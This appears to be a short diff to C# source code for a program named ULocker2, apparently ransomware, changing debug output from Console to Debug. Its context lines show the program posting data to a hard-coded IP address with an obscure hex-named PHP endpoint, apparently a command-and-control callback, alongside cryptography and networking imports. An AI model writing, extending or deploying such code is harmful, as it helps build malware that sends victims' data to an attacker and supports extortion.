@@ -11,6 +11,7 @@ using System.Management;
 using System.Threading;
 using System.Security.Cryptography;
 using System.Net;
+using System.Diagnostics;
 
 namespace ULocker2
 {
@@ -171,8 +172,8 @@ namespace ULocker2
 			*/
 			recv = PostAndRecv(postData, "http://107.167.191.113/e7b048d514f5a233ff9afdd97b0394ca.php");
 
-			Console.WriteLine("postData = " + postData);
-			Console.WriteLine("recv = " + recv);
+			Debug.WriteLine("postData = " + postData);
+			Debug.WriteLine("recv = " + recv);
 
 			//MessageBox.Show(recv);
 
